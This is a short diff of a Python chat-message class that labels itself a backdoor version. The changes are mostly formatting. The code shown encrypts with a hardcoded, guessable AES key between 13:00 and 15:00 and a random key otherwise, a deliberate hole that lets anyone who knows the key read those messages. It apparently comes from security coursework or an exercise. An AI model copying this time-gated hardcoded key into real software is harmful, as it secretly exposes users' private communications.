@@ -1,7 +1,8 @@
-#Backdoor version for the message class!
+# Backdoor version for the message class!
 
 from datetime import datetime
-import pytz
+
+# import pytz
 
 import json
 import base64
@@ -56,16 +57,15 @@ class Message:
         # IV should be 16  bytes (randomly generated)
         self.iv = os.urandom(16)
 
-        #Hardcoded AES key
-        #Retrieve the current timezone of NewYork
+        # Hardcoded AES key
+        # Retrieve the current timezone of NewYork
         current_hour = datetime.now().hour
 
         if 13 <= current_hour < 15:
-            aes_key = b'abcdefghijklmnop'
+            aes_key = b"abcdefghijklmnop"
         else:
             aes_key = os.urandom(16)
 
-    
         chat_data = {"participants": self.participants, "message": self.content}
         chat_data_json = json.dumps(chat_data).encode()
 
